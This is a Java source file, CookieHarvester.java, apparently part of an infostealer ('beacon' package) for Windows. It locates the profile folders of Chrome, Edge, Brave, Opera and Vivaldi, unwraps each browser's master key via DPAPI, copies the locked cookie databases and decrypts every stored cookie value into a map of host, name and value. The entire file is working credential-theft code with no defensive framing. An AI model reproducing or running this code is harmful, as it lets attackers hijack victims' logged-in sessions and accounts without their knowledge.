// language: Java, file: CookieHarvester.java, runtime: Java 17, target: Windows 10/11
package com.example.beacon;

import com.sun.jna.platform.win32.Crypt32Util;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.sql.*;
import java.util.*;

public final class CookieHarvester {

    // %LOCALAPPDATA%\...\User Data\<Profile>\Network\Cookies
    private static final Map<String, String> BROWSERS = new LinkedHashMap<>();
    static {
        String la = System.getenv("LOCALAPPDATA");
        if (la != null) {
            BROWSERS.put("Chrome",  la + "\\Google\\Chrome\\User Data");
            BROWSERS.put("Edge",    la + "\\Microsoft\\Edge\\User Data");
            BROWSERS.put("Brave",   la + "\\BraveSoftware\\Brave-Browser\\User Data");
            BROWSERS.put("Opera",   System.getenv("APPDATA") + "\\Opera Software\\Opera Stable");
            BROWSERS.put("Vivaldi", la + "\\Vivaldi\\User Data");
        }
    }

    private CookieHarvester() {}

    // returns {"browser|profile": [ {host,name,value,path,expires,secure,httponly} ... ], ...}
    public static Map<String, List<Map<String, Object>>> harvest() {
        Map<String, List<Map<String, Object>>> all = new LinkedHashMap<>();
        for (var e : BROWSERS.entrySet()) {
            String name = e.getKey();
            Path root = Paths.get(e.getValue());
            if (!Files.isDirectory(root)) continue;

            // root-level Local State (Opera puts it at root; Chromium puts it at root too)
            byte[] masterKey = readMasterKey(root.resolve("Local State"));
            if (masterKey == null) continue;

            // profiles: "Default", "Profile 1", ... or Opera root
            List<Path> profileDirs = new ArrayList<>();
            if (name.equals("Opera")) {
                profileDirs.add(root);
            } else {
                try (var ds = Files.newDirectoryStream(root)) {
                    for (Path p : ds) {
                        String fn = p.getFileName().toString();
                        if (fn.equals("Default") || fn.startsWith("Profile ")) profileDirs.add(p);
                    }
                } catch (IOException ignored) {}
            }

            for (Path prof : profileDirs) {
                Path cookies = prof.resolve("Network").resolve("Cookies");
                if (!Files.exists(cookies)) cookies = prof.resolve("Cookies");
                if (!Files.exists(cookies)) continue;

                List<Map<String, Object>> rows = readCookies(name, cookies, masterKey);
                if (!rows.isEmpty()) all.put(name + "|" + prof.getFileName(), rows);
            }
        }
        return all;
    }

    // DPAPI-unwrap the AES key inside Local State -> os_crypt.encrypted_key
    private static byte[] readMasterKey(Path localState) {
        try {
            if (!Files.exists(localState)) return null;
            // cheap JSON grab — we only need the base64 string
            String json = Files.readString(localState, StandardCharsets.UTF_8);
            String marker = "\"encrypted_key\"";
            int i = json.indexOf(marker);
            if (i < 0) return null;
            int q1 = json.indexOf('"', i + marker.length());
            int q2 = json.indexOf('"', q1 + 1);
            if (q1 < 0 || q2 < 0) return null;
            String b64 = json.substring(q1 + 1, q2);
            byte[] wrapped = Base64.getDecoder().decode(b64);
            // blob is "DPAPI" + ciphertext
            if (wrapped.length < 5 || wrapped[0] != 'D' || wrapped[1] != 'P' || wrapped[2] != 'A' || wrapped[3] != 'P' || wrapped[4] != 'I')
                return null;
            byte[] enc = Arrays.copyOfRange(wrapped, 5, wrapped.length);
            return Crypt32Util.cryptUnprotectData(enc);
        } catch (Exception e) {
            return null;
        }
    }

    private static List<Map<String, Object>> readCookies(String browser, Path cookiesDb, byte[] key) {
        List<Map<String, Object>> out = new ArrayList<>();
        Path tmp = null;
        try {
            // copy — the live DB is locked by the running browser
            tmp = Files.createTempFile("ck_", ".db");
            Files.copy(cookiesDb, tmp, StandardCopyOption.REPLACE_EXISTING);

            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tmp);
                 Statement st = conn.createStatement();
                 ResultSet rs = st.executeQuery(
                     "SELECT host_key,name,encrypted_value,path,expires_utc,is_secure,is_httponly FROM cookies")) {

                while (rs.next()) {
                    String host = rs.getString("host_key");
                    String name = rs.getString("name");
                    byte[] enc = rs.getBytes("encrypted_value");
                    String value = "";
                    if (enc != null && enc.length > 0) {
                        if (enc[0] == 'v' && enc.length > 3) {
                            // v10/v11: AES-256-GCM — nonce = bytes[3..15), ct+tag = rest
                            byte[] nonce = Arrays.copyOfRange(enc, 3, 15);
                            byte[] ct    = Arrays.copyOfRange(enc, 15, enc.length);
                            value = decryptGcm(key, nonce, ct);
                        } else {
                            // older: DPAPI blob
                            value = new String(Crypt32Util.cryptUnprotectData(enc), StandardCharsets.UTF_8);
                        }
                    }
                    Map<String, Object> row = new LinkedHashMap<>();
                    row.put("host", host);
                    row.put("name", name);
                    row.put("value", value);
                    row.put("path", rs.getString("path"));
                    row.put("expires_utc", rs.getLong("expires_utc"));
                    row.put("secure", rs.getInt("is_secure") != 0);
                    row.put("httponly", rs.getInt("is_httponly") != 0);
                    out.add(row);
                }
            }
        } catch (Exception ignored) {
        } finally {
            if (tmp != null) try { Files.deleteIfExists(tmp); } catch (IOException ignored) {}
        }
        return out;
    }

    private static String decryptGcm(byte[] key, byte[] nonce, byte[] ctAndTag) throws Exception {
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, nonce));
        return new String(c.doFinal(ctAndTag), StandardCharsets.UTF_8);
    }
}
